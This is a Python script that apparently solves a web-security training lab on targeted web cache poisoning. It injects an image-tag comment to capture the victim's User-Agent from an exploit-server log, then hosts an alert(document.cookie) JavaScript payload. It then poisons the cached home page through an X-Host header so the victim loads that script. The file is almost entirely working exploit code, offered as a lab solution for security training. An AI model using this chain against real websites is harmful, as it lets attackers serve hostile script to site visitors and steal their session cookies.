import requests
import re
from urllib.parse import unquote_plus
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None
        self.user_agent = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def post_malicious_comment(self):
        data = {
            'csrf': self.get_csrf_token('post?postId=1'),
            'postId': 1,
            'comment': '<img src="{}" >'.format(self.exploit_server_url + '/foo'),
            'name': 'hello',
            'email': 'hello@hello.com',
            'website': 'https://hello.com'
        }
        self.session.post(self.lab_url + 'post/comment', data=data)

    def get_victim_user_agent(self):
        response = self.session.get(self.exploit_server_url + '/log')
        self.user_agent = re.findall(r'user-agent: (.*)&', response.text)[-1]

    def store_payload_on_exploit_server(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/resources/js/tracking.js',
            'responseHead': unquote_plus('HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8'),
            'responseBody': 'alert(document.cookie)',
            'formAction': 'STORE'
        }
        self.session.post(self.exploit_server_url, data=data)

    def poison_home_page(self):
        headers = {
            'X-Host': self.exploit_server_url.replace('https://', ''),
            'User-Agent': self.user_agent
        }
        response = self.session.get(self.lab_url, headers=headers)
        while True:
            if (self.exploit_server_url.replace('https://', '') + '/resources/js/tracking.js') not in response.text:
                response = self.session.get(self.lab_url, headers=headers)
            else:
                break

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.post_malicious_comment()
        time.sleep(30)
        self.get_victim_user_agent()
        self.store_payload_on_exploit_server()
        self.poison_home_page()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
